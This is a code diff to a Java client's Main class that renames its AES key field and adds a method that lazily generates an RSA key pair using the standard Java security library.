@@ -11,6 +11,10 @@ import java.awt.SystemTray;
 import java.awt.TrayIcon;
 import java.io.File;
 import java.io.InputStream;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.PrivateKey;
+import java.security.PublicKey;
 import java.util.Date;
 import java.util.HashMap;
 
@@ -22,7 +26,10 @@ public class Main {
 	public static String[] addresses;
 	public static String id;
 	public static String pass;
-	public static byte[] encryptionKey;
+	
+	public static byte[] aesKey;
+	public static KeyPair rsaPair;
+	
 	public static long reconnectSeconds;
 	public static String name;
 	public static boolean running = true;
@@ -47,7 +54,7 @@ public class Main {
 			InputStream keyFileInputStream = Main.class.getResourceAsStream("/key.dat");
 			byte[] keyBuffer = new byte[keyFileInputStream.available()];
 			keyFileInputStream.read(keyBuffer);
-			encryptionKey = keyBuffer;
+			aesKey = keyBuffer;
 
 			InputStream configFileInputStream = Main.class.getResourceAsStream("/config.dat");
 			byte[] configBuffer = new byte[configFileInputStream.available()];
@@ -195,7 +202,7 @@ public class Main {
 	}
 
 	public static byte[] getKey() {
-		return encryptionKey;
+		return aesKey;
 	}
 
 	public static String debug(Object s) {
@@ -207,6 +214,20 @@ public class Main {
 		}
 		System.out.println(s.toString());
 		return s.toString();
+	}
+
+	public static KeyPair getKeyPair() throws Exception {
+		if (rsaPair == null) {
+			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
+			kpg.initialize(Crypto.RSA_SIZE);
+			KeyPair kp = kpg.genKeyPair();
+			PublicKey publicKey = kp.getPublic();
+			PrivateKey privateKey = kp.getPrivate();
+			
+			rsaPair = new KeyPair(publicKey, privateKey);
+		}
+		
+		return rsaPair;
 	}
 
 }
